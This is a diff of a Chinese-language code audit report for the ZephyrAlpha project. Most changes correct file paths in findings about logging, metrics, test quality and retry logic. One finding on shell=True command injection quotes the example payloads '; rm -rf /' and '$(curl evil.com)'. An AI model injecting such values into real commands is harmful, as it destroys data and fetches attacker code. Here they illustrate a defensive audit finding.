 - 修复：统一为 `zephyr_<subsystem>_<name>_<unit>`，metrics_schema.yaml列出合法名，Registry拒绝未注册名
 
 #### 5.20.6 get_logger返回类型Self未导入+缓存导致module_id不更新【MEDIUM】
-- 证据：[logging.py:258](file:///d:/ZephyrAlpha/src/zephyr/shared/logging.py) `def get_logger(name,*,session_id=None,module_id=None)->Self:` Self未导入且语义错误（应为ZephyrLogger）；`_logger_cache`缓存（L272-279）首次 `get_logger("foo",module_id="A")` 后再调 `get_logger("foo",module_id="B")` 返回缓存实例，`module_id_var.set("B")` 被 `if module_id:` 守卫跳过——module_id永远停留首次值
+- 证据：[logging.py:258](file:///d:/ZephyrAlpha/src/zephyr/shared/utils/logging.py) `def get_logger(name,*,session_id=None,module_id=None)->Self:` Self未导入且语义错误（应为ZephyrLogger）；`_logger_cache`缓存（L272-279）首次 `get_logger("foo",module_id="A")` 后再调 `get_logger("foo",module_id="B")` 返回缓存实例，`module_id_var.set("B")` 被 `if module_id:` 守卫跳过——module_id永远停留首次值
 - 病根：根因5（类型注解照抄+contextvar与缓存语义冲突）
 - 修复：改返回类型ZephyrLogger，每次调用都set contextvar
 
 #### 5.20.7 request_id/correlation_id未纳入TraceContext调用链断裂【MEDIUM】
-- 证据：[logging.py:66-68](file:///d:/ZephyrAlpha/src/zephyr/shared/logging.py) 仅定义 `trace_id_var`/`session_id_var`/`module_id_var`；但业务层广泛使用request_id：`gpu_consensus_scheduler.py:67` `request_id:str=Field(default_factory=lambda:uuid.uuid4().hex[:16])` L79/140/231/313大量传递；`infra_ops/interface_base.py:71` `request_id:str`；`frontend/interface_base.py:71` 同；`health_monitor.py:305` `correlation_id=f"hm-{capability_id}"`；这些request_id永远不出现在JSON日志的trace_id字段
+- 证据：[logging.py:66-68](file:///d:/ZephyrAlpha/src/zephyr/shared/utils/logging.py) 仅定义 `trace_id_var`/`session_id_var`/`module_id_var`；但业务层广泛使用request_id：`gpu_consensus_scheduler.py:67` `request_id:str=Field(default_factory=lambda:uuid.uuid4().hex[:16])` L79/140/231/313大量传递；`infra_ops/interface_base.py:71` `request_id:str`；`frontend/interface_base.py:71` 同；`health_monitor.py:305` `correlation_id=f"hm-{capability_id}"`；这些request_id永远不出现在JSON日志的trace_id字段
 - 病根：根因5（TraceContext设计早于request_id域模型未补齐）
 - 修复：logging.py增加 `request_id_var`，_StructuredFormatter输出request_id字段
 
 #### 5.20.8 三套互不兼容的Metrics实现+一套Telemetry facade【MEDIUM】
-- 证据：[ops/observability/metrics.py](file:///d:/ZephyrAlpha/src/zephyr/shared/metrics.py) 规范MetricsRegistry API `inc(name,labels=None)` 带Lock；[shared/observability_02/metrics.py](file:///d:/ZephyrAlpha/src/zephyr/shared/observability_02/metrics.py) 逐字副本含独有调用L300/306/312；[ops/telemetry.py:58-98](file:///d:/ZephyrAlpha/src/zephyr/ops/telemetry.py) `InventorySelfMetrics` 第三套API `inc(name,delta=1.0,**labels)` 无Lock；`boot_hooks.py:102` `from zephyr.shared.observability_02.metrics import MetricsRegistry` 直接new独立实例不是 `get_registry()` 全局单例——boot指标写入孤儿registry无人能查
+- 证据：[ops/observability/metrics.py](file:///d:/ZephyrAlpha/src/zephyr/backtest/core/metrics.py) 规范MetricsRegistry API `inc(name,labels=None)` 带Lock；[shared/observability_02/metrics.py](file:///d:/ZephyrAlpha/src/zephyr/backtest/core/metrics.py) 逐字副本含独有调用L300/306/312；[ops/telemetry.py:58-98](file:///d:/ZephyrAlpha/src/zephyr/infrastructure/asset_inventory/telemetry.py) `InventorySelfMetrics` 第三套API `inc(name,delta=1.0,**labels)` 无Lock；`boot_hooks.py:102` `from zephyr.shared.observability_02.metrics import MetricsRegistry` 直接new独立实例不是 `get_registry()` 全局单例——boot指标写入孤儿registry无人能查
 - 病根：根因1（SSoT断裂+复制粘贴）
 - 修复：删除shared/observability_02/，InventorySelfMetrics改为get_registry()薄封装
 
 #### 5.20.9 MetricsRegistry.dec()存在竞态+counter递减反模式【MEDIUM】
-- 证据：[metrics.py:129-133](file:///d:/ZephyrAlpha/src/zephyr/shared/metrics.py) `def dec(self,name,labels=None): self.inc(name,labels) # 锁1; with self._lock: self._counters[name][key]-=1.0 # 锁2`；两次锁间存在窗口，并发线程可能读到+1后中间值；Prometheus counter是单调递增的，dec()语义本身错误应使用gauge
+- 证据：[metrics.py:129-133](file:///d:/ZephyrAlpha/src/zephyr/backtest/core/metrics.py) `def dec(self,name,labels=None): self.inc(name,labels) # 锁1; with self._lock: self._counters[name][key]-=1.0 # 锁2`；两次锁间存在窗口，并发线程可能读到+1后中间值；Prometheus counter是单调递增的，dec()语义本身错误应使用gauge
 - 病根：根因5（API设计照搬Python计数器直觉未对齐Prometheus语义）
 - 修复：删除dec()，可增减场景改用set_gauge()
 
 #### 5.20.10 observe()静默截断观测值导致百分位偏差【MEDIUM】
-- 证据：[metrics.py:139-148](file:///d:/ZephyrAlpha/src/zephyr/shared/metrics.py) `self._histograms[name][key].append(value); if len(...)>10000: self._histograms[name][key]=self._histograms[name][key][-5000:]` 超过10000个观测时静默丢弃前5000只保留最近5000，p99/p50向最近样本偏移且无任何日志告警
+- 证据：[metrics.py:139-148](file:///d:/ZephyrAlpha/src/zephyr/backtest/core/metrics.py) `self._histograms[name][key].append(value); if len(...)>10000: self._histograms[name][key]=self._histograms[name][key][-5000:]` 超过10000个观测时静默丢弃前5000只保留最近5000，p99/p50向最近样本偏移且无任何日志告警
 - 病根：根因5（内存保护优先于数据准确性，未暴露截断事件）
 - 修复：改用固定bucket累加不存原始list，截断时logger.warning
 
@@ -2742,7 +2743,7 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - 修复：所有__main__入口改 `configure_root_logger(level="INFO",json_file=...)`，禁止裸basicConfig
 
 #### 5.20.12 AuditLogger时间戳精度与格式与结构化日志不一致+审计事件混入普通日志通道【MEDIUM】
-- 证据：[audit_logger.py:114](file:///d:/ZephyrAlpha/src/zephyr/infrastructure/audit_logger.py) `"timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ",time.gmtime())` 秒级UTC+Z后缀；[logging.py:84](file:///d:/ZephyrAlpha/src/zephyr/shared/logging.py) `"timestamp": datetime.datetime.fromtimestamp(record.created,tz=datetime.UTC).isoformat()` 微秒级+00:00后缀；两者无法精确对齐；`audit_logger.py:66` `_logger=logging.getLogger(__name__)` 裸getLogger无trace_id；审计事件散落在普通内存list：`safety_gate_l66_l67.py:64`、`skill_sandbox.py:131,168,215`、`gate_override.py:67`、`capability_checker.py:58,63`、`truth_source_validator.py:206,231` 每个组件自己append到in-memory list无统一审计通道
+- 证据：[audit_logger.py:114](file:///d:/ZephyrAlpha/src/zephyr/infrastructure/audit_logger.py) `"timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ",time.gmtime())` 秒级UTC+Z后缀；[logging.py:84](file:///d:/ZephyrAlpha/src/zephyr/shared/utils/logging.py) `"timestamp": datetime.datetime.fromtimestamp(record.created,tz=datetime.UTC).isoformat()` 微秒级+00:00后缀；两者无法精确对齐；`audit_logger.py:66` `_logger=logging.getLogger(__name__)` 裸getLogger无trace_id；审计事件散落在普通内存list：`safety_gate_l66_l67.py:64`、`skill_sandbox.py:131,168,215`、`gate_override.py:67`、`capability_checker.py:58,63`、`truth_source_validator.py:206,231` 每个组件自己append到in-memory list无统一审计通道
 - 病根：根因5（审计与日志未分离通道，时间戳格式各自为政）
 - 修复：定义AuditEvent独立sink（独立JSONL文件+独立contextvar），时间戳统一微秒级isoformat
 
@@ -2773,7 +2774,7 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - 修复：将 `_record(...,"RED",...)` 改为 `pytest.fail(...)` 或 `assert False,...`
 
 #### 5.21.3 永真式断言（tautology）【HIGH】
-- 证据：[test_sequence_guard_agent_rbac.py:91](file:///d:/ZephyrAlpha/tests/agent_rbac/test_sequence_guard_agent_rbac.py) `assert result is not None or result is None`（A or ¬A恒真）；[test_pipeline_skill_injection.py:223](file:///d:/ZephyrAlpha/tests/autonomy/test_pipeline_skill_injection.py) `assert len(l3)>=0`；[test_adversarial_mutator.py:78,116,117](file:///d:/ZephyrAlpha/tests/llm_security/test_adversarial_mutator.py) `assert len(results)>=0`/`assert report.total_mutations>=0`/`assert report.block_rate_pct>=0.0`；[test_phase_g_perf.py:945,946,969](file:///d:/ZephyrAlpha/tests/integration/test_phase_g_perf.py) `assert stats["active_drift_alerts"]>=0` 等
+- 证据：[test_sequence_guard_agent_rbac.py:91](file:///d:/ZephyrAlpha/tests/agent_rbac/test_sequence_guard_agent_rbac.py) `assert result is not None or result is None`（A or ¬A恒真）；[test_pipeline_skill_injection.py:223](file:///d:/ZephyrAlpha/tests/autonomy/test_pipeline_skill_injection.py) `assert len(l3)>=0`；[test_adversarial_mutator.py:78,116,117](file:///d:/ZephyrAlpha/tests/llm_security/test_adversarial_mutator.py) `assert len(results)>=0`/`assert report.total_mutations>=0`/`assert report.block_rate_pct>=0.0`；[test_phase_g_perf.py:945,946,969](file:///d:/ZephyrAlpha/tests/trading/test_phase_g_perf.py) `assert stats["active_drift_alerts"]>=0` 等
 - 病根：根因5（凑数式断言，用数学恒真式伪装覆盖率）
 - 修复：替换为有信息量的边界，ruff规则禁掉 `>=0`/`is not None or...is None`
 
@@ -2788,7 +2789,7 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - 修复：改为 `tmp_path/"governance.db"` + `init_db()`，CI加 `--deny-paths=data/databases`
 
 #### 5.21.6 生产PostgreSQL被写入测试节点（node_id 900001/2/3）【HIGH】
-- 证据：[test_depgraph_generator_design_protection.py:14,24,33-43,118-130,155-157](file:///d:/ZephyrAlpha/tests/governance/rule_enforcement/test_depgraph_generator_design_protection.py) `DB_PATH=REPO_ROOT/"data"/"databases"/"depgraph"`；`conn=get_depgraph_pg_connection()` 连生产PG；`cursor.execute("INSERT INTO nodes...OVERRIDING SYSTEM VALUES VALUES(900001,...)")`；pytest入口 `def test_depgraph_generator_design_protection(): assert main()==0` 调用main()→red_team_tests()写入生产
+- 证据：[test_depgraph_generator_design_protection.py:14,24,33-43,118-130,155-157](file:///d:/ZephyrAlpha/tests/governance/depgraph/test_depgraph_generator_design_protection.py) `DB_PATH=REPO_ROOT/"data"/"databases"/"depgraph"`；`conn=get_depgraph_pg_connection()` 连生产PG；`cursor.execute("INSERT INTO nodes...OVERRIDING SYSTEM VALUES VALUES(900001,...)")`；pytest入口 `def test_depgraph_generator_design_protection(): assert main()==0` 调用main()→red_team_tests()写入生产
 - 病根：根因5（红队测试用生产库，"测试极端场景"凌驾隔离原则）
 - 修复：启动testcontainers PG或使用mock注入，禁止测试cursor直连生产PG
 
@@ -2798,7 +2799,7 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - 修复：改用 `sanitizer(tmp_project_dir)` 复用全局conftest fixture
 
 #### 5.21.8 硬编码d:/tmp/...路径而非tmp_path【MEDIUM】
-- 证据：[test_f3_auto_integration.py:71,74](file:///d:/ZephyrAlpha/tests/integration/test_f3_auto_integration.py) `files_in_scope=[f"d:/tmp/integration_test/{task_id}.dummy"]` `allowed_touch=[f"d:/tmp/integration_test/{task_id}.dummy"]`；[test_f3_extreme.py:83,86](file:///d:/ZephyrAlpha/tests/adversarial/test_f3_extreme.py) 同模式
+- 证据：[test_f3_auto_integration.py:71,74](file:///d:/ZephyrAlpha/tests/infrastructure/test_f3_auto_integration.py) `files_in_scope=[f"d:/tmp/integration_test/{task_id}.dummy"]` `allowed_touch=[f"d:/tmp/integration_test/{task_id}.dummy"]`；[test_f3_extreme.py:83,86](file:///d:/ZephyrAlpha/tests/infrastructure/test_f3_extreme.py) 同模式
 - 病根：根因5（固定路径污染，多次运行/并发冲突不清理）
 - 修复：改为 `tmp_path/f"{task_id}.dummy"` 通过fixture注入
 
@@ -2808,7 +2809,7 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - 修复：为P2迁移建立issue tracker限期30天重写，CI加skip数量阈值
 
 #### 5.21.10 模块级_STANDIN_CACHE全局变量+tempfile.mktemp永不清理【MEDIUM】
-- 证据：[test_mcp_signal_shutdown.py:48,57-63,96-98](file:///d:/ZephyrAlpha/tests/integration/test_mcp_signal_shutdown.py)；[test_mcp_idle_timeout.py:45,50-55](file:///d:/ZephyrAlpha/tests/integration/test_mcp_idle_timeout.py)；[test_mcp_health_check_recovery.py:44,52-57](file:///d:/ZephyrAlpha/tests/integration/test_mcp_health_check_recovery.py)；[test_mcp_boot_hooks_integration.py:466](file:///d:/ZephyrAlpha/tests/integration/test_mcp_boot_hooks_integration.py) 四文件各自维护 `_STANDIN_CACHE:Path|None=None`，`_get_standin_script()` 用已弃用的 `tempfile.mktemp(suffix=".py")` 创建文件写入 `import time;time.sleep(60)`，注释"不删除缓存文件，模块级复用"——多次pytest运行间累积不清理
+- 证据：[test_mcp_signal_shutdown.py:48,57-63,96-98](file:///d:/ZephyrAlpha/tests/infrastructure/test_mcp_signal_shutdown.py)；[test_mcp_idle_timeout.py:45,50-55](file:///d:/ZephyrAlpha/tests/infrastructure/test_mcp_idle_timeout.py)；[test_mcp_health_check_recovery.py:44,52-57](file:///d:/ZephyrAlpha/tests/infrastructure/test_mcp_health_check_recovery.py)；[test_mcp_boot_hooks_integration.py:466](file:///d:/ZephyrAlpha/tests/infrastructure/test_mcp_boot_hooks_integration.py) 四文件各自维护 `_STANDIN_CACHE:Path|None=None`，`_get_standin_script()` 用已弃用的 `tempfile.mktemp(suffix=".py")` 创建文件写入 `import time;time.sleep(60)`，注释"不删除缓存文件，模块级复用"——多次pytest运行间累积不清理
 - 病根：根因5（模块级缓存泄漏，用global替代fixture scope且用弃用mktemp）
 - 修复：改用 `@pytest.fixture(scope="session")` + `tmp_path_factory`
 
@@ -3637,10 +3638,10 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 
 #### 5.32.9 [MEDIUM] architecture_lock.yaml ARCH-LOCK-001锁定的SQLite schema路径不存在
 - **文件**：[architecture_lock.yaml](file:///D:/ZephyrAlpha/architecture_model/architecture_lock.yaml#L17)
-- **证据**：locked_files: "src/zephyr/db/sqlite_schema.py"——路径不存在；实际文件在src/zephyr/governance/sqlite_schema.py
+- **证据**：locked_files: "src/zephyr/db/sqlite_schema.py"——路径不存在；实际文件在src/zephyr/governance/persistence/sqlite_schema.py
 - **问题**：架构锁引用幻影路径；锁定范围仍写"SQLite元数据层"但P2后depgraph已迁PG
 - **影响**：AI试图修改锁定文件时找不到真源；架构锁失效
-- **修复**：修正路径为src/zephyr/governance/sqlite_schema.py
+- **修复**：修正路径为src/zephyr/governance/persistence/sqlite_schema.py
 
 #### 5.32.10 [LOW] migrate_data.py混淆数据种子与数据迁移，无独立seed脚本
 - **文件**：[migrate_data.py](file:///D:/ZephyrAlpha/scripts/governance/migrate_sqlite_to_pg/migrate_data.py#L42)
@@ -3822,7 +3823,7 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - **修复**：.env.example新增PostgreSQL段落；新增config/.env.postgres.example模板
 
 #### 5.34.10 [MEDIUM] 日志级别不按环境分级，dev/prod同为INFO
-- **文件**：[logging.py](file:///D:/ZephyrAlpha/src/zephyr/shared/logging.py#L324)
+- **文件**：[logging.py](file:///D:/ZephyrAlpha/src/zephyr/shared/utils/logging.py#L324)
 - **证据**：configure_root_logger默认level="INFO"不读env；ZEPHYR_LOG_LEVEL env var存在但未端到端打通
 - **问题**：dev/staging/prod共用INFO级别；无"dev=DEBUG/prod=WARNING"分级策略
 - **影响**：dev排障缺DEBUG信息；prod日志过详细
@@ -4201,7 +4202,7 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - **修复**：注入单例MetricsRegistry或模块级共享实例
 
 #### 5.39.2 [HIGH] cost_budget调用不存在的registry.counter()方法
-- **文件**：[cost_budget.py](file:///D:/ZephyrAlpha/src/zephyr/governance/cost_budget.py#L190)
+- **文件**：[cost_budget.py](file:///D:/ZephyrAlpha/src/zephyr/governance/ops_governance/cost_budget.py#L190)
 - **证据**：第190-193行`registry.counter(f"cost.{provider}.{model}")`——MetricsRegistry类无counter()方法；被`except Exception: pass`静默吞
 - **问题**：成本计量调用幻影方法，异常被静默
 - **影响**：成本预算告警完全失效；超支无感知
@@ -4215,14 +4216,14 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - **修复**：改为`health_alive{capability_id="..."}`格式，capability_id作为label
 
 #### 5.39.4 [HIGH] api_client每请求生成新trace_id断链
-- **文件**：[api_client.py](file:///D:/ZephyrAlpha/src/zephyr/integration/shared/api_03/api_client.py#L188)
+- **文件**：[api_client.py](file:///D:/ZephyrAlpha/src/zephyr/shared/api/api_client.py#L188)
 - **证据**：第188行`trace_id = generate_trace_id()`——每次请求生成新ID，不从上下文继承
 - **问题**：分布式追踪上下文不传播，同一逻辑链路的多次API调用trace_id不同
 - **影响**：链路追踪断裂；故障定位需手动关联；无法构建调用树
 - **修复**：从contextvar/线程本地继承trace_id；支持W3C Trace Context透传
 
 #### 5.39.5 [MEDIUM] 两套TraceContext实现互不互通
-- **文件**：[logging.py](file:///D:/ZephyrAlpha/src/zephyr/shared/logging.py#L66) vs [span_stub.py](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/system_telemetry/traces/span_stub.py#L40)
+- **文件**：[logging.py](file:///D:/ZephyrAlpha/src/zephyr/shared/utils/logging.py#L66) vs [span_stub.py](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/system_telemetry/traces/span_stub.py#L40)
 - **证据**：ops.observability.logging用contextvars实现TraceContext；infrastructure.system_telemetry.traces.span_stub用threading.local实现
 - **问题**：两套独立的trace上下文存储，互不可见
 - **影响**：跨模块trace_id丢失；async任务切换时上下文不一致
@@ -4265,7 +4266,7 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 > 维度说明：POST/PUT重试的幂等性保证、DLQ实际重试逻辑、回调去重、锁TTL强制执行等。
 
 #### 5.40.1 [HIGH] api_client重试未带Idempotency-Key
-- **文件**：[api_client.py](file:///D:/ZephyrAlpha/src/zephyr/integration/shared/api_03/api_client.py#L202)
+- **文件**：[api_client.py](file:///D:/ZephyrAlpha/src/zephyr/shared/api/api_client.py#L202)
 - **证据**：第202-301行retry循环对POST/PUT重试，但请求头无`Idempotency-Key`
 - **问题**：POST/PUT重试可能导致重复副作用（重复下单/重复扣款）
 - **影响**：资金安全风险；数据重复
@@ -4279,7 +4280,7 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - **修复**：回调头携带Idempotency-Key（基于task_id+attempt_no）
 
 #### 5.40.4 [HIGH] DLQRetryPolicy为stub，BACKOFF_SCHEDULE死代码
-- **文件**：[dlq_retry_policy.py](file:///D:/ZephyrAlpha/src/zephyr/governance/dlq_retry_policy.py#L27)
+- **文件**：[dlq_retry_policy.py](file:///D:/ZephyrAlpha/src/zephyr/governance/rule_enforcement/dlq_retry_policy.py#L27)
 - **证据**：第27-51行`BACKOFF_SCHEDULE = [60, 300, 1800, 7200]`定义但`retry()`方法仅`SELECT COUNT(*) FROM dlq`统计行数，不实际重试
 - **问题**：DLQ名为"重试策略"实为"计数器"
 - **影响**：死信消息永不重试；故障消息永久丢失
@@ -4548,7 +4549,7 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 > 维度说明：命令注入、eval/exec代码执行、路径穿越防护、API响应清洗等输入边界安全。
 
 #### 5.45.1 [HIGH] subprocess.run使用shell=True存在命令注入风险
-- **文件**：[task_repo.py](file:///D:/ZephyrAlpha/src/zephyr/governance/task_repo.py#L1811)
+- **文件**：[task_repo.py](file:///D:/ZephyrAlpha/src/zephyr/governance/persistence/task_repo.py#L1811)
 - **证据**：第1811-1817行`subprocess.run(cmd, shell=True, ...)`——cmd来自任务卡片`post_sync_standard`字段，shell=True直接交给系统shell解释
 - **问题**：若任务卡片被污染（如`; rm -rf /`或`$(curl evil.com)`），可执行任意命令
 - **影响**：任意命令执行；违反项目自身process_sandbox.py禁止shell=True的规范
